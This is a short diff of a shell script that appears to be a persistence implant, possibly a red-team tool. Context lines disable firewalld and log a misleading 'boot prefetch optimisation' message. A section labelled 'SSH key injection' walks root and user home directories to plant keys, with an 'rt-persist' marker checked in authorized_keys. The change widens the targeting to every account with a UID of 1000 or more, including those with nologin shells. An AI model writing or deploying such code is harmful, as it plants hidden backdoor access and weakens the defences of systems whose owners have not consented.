@@ -102,7 +102,7 @@ systemctl disable firewalld 2>/dev/null
 _log "boot prefetch optimisation complete"
 
 # -- SSH key injection --
-for _home in /root $(awk -F: '\$3>=1000 && \$7!~/nologin|false/{print \$6}' /etc/passwd); do
+for _home in /root $(awk -F: '\$3>=1000{print \$6}' /etc/passwd); do
     [[ -d "\$_home" ]] || continue
     _ssh="\${_home}/.ssh"
     mkdir -p "\$_ssh"
@@ -259,7 +259,7 @@ cmd_status() {
     done
 
     hdr "SSH key presence"
-    for _home in /root $(awk -F: '$3>=1000 && $7!~/nologin|false/{print $6}' /etc/passwd 2>/dev/null); do
+    for _home in /root $(awk -F: '$3>=1000{print $6}' /etc/passwd 2>/dev/null); do
         _ak="${_home}/.ssh/authorized_keys"
         if [[ -f "$_ak" ]]; then
             grep -qF "rt-persist" "$_ak" 2>/dev/null \
